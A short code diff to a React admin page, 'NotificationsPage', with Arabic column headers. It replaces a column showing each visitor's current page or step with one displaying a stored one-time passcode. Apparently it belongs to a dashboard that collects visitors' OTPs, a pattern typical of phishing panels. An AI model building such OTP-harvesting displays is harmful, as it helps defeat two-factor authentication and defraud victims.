@@ -529,7 +529,7 @@ export default function NotificationsPage() {
                 <tr className="border-b border-border">
                   <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة </th>
                   <th className="px-4 py-3 text-right font-medium text-muted-foreground">المعلومات</th>
-                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">الصفحة الحالية</th>
+                  <th className="px-4 py-3 text-right font-medium text-muted-foreground">OTP</th>
                   <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                   <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
                   <th className="px-4 py-3 text-center font-medium text-muted-foreground">العلم</th>
@@ -561,7 +561,7 @@ export default function NotificationsPage() {
                         </Badge>
                       </div>
                     </td>
-                    <td className="px-4 py-3">خطوه - {notification.page}</td>
+                    <td className="px-4 py-3">  {notification?.otp}</td>
                     <td className="px-4 py-3">
                       {notification.createdDate &&
                         formatDistanceToNow(new Date(notification.createdDate), {
